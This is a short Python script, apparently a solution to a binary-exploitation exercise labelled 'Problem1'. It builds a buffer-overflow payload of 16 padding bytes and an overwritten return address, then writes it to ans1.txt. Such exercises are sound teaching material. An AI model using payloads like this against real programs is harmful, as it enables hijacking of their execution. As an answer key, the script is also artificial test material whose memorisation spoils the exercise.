payload = b'A' * 16 + b'\x16\x12\x40\x00'

with open("ans1.txt", "wb") as f:
    f.write(payload)
print("Payload for Problem1 written to ans1.txt")